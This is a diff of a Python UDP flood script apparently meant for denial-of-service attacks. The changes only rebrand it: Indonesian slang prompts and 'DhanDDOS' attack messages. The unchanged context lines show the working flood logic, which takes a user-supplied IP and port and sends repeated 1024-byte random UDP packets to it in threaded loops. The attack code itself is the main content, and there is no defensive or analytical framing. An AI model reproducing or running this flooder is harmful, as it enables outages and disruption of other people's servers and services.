@@ -22,13 +22,13 @@ print("""
 \033[261m──██▒▒▒▒██──██▒▒▒▒██─██▒▒██──██▒▒▒▒▒▒██
 \033[261m───███████──████████─██████──██████████
 \033[261m──────────────────────────────────────""")
-print("\033[31m━━━ Afah Iyah? (y/n)")
+print("\033[31m━━━ kamu nanyak? (y/n)")
 choice = str(input("┗━>\033[0m:"))
 time.sleep(1)
-print("\033[31m━━━ IPnya Tod")
+print("\033[31m━━━ IPnya Su")
 ip = str(input("┗━>\033[0m:"))
 time.sleep(1)
-print("\033[31m━━━ Port")
+print("\033[31m━━━ Portnya Mek")
 port = int(input("┗━>\033[0m:"))
 time.sleep(1)
 print("\033[31m━━━ Packets")	
@@ -47,9 +47,9 @@ def xxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[91m}=====> ATTACK PACKET DhanDDOS \033[0m%s:%s!!!"%(ip,port))
     except:
-      print("[!] XR ATTACK SERVER")
+      print("[!] Dhan Attack Server")
 
 def xxx():
   data = random._urandom(1024)
@@ -60,9 +60,9 @@ def xxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[91m}=====> ATTACK PACKET DhanDDOS \033[0m%s:%s!!!"%(ip,port))
     except:
-      print("[!] XR ATTACK SERVER")
+      print("[!] Dhan Attack Server")
 
 for y in range(threads):
   if choice == 'y':
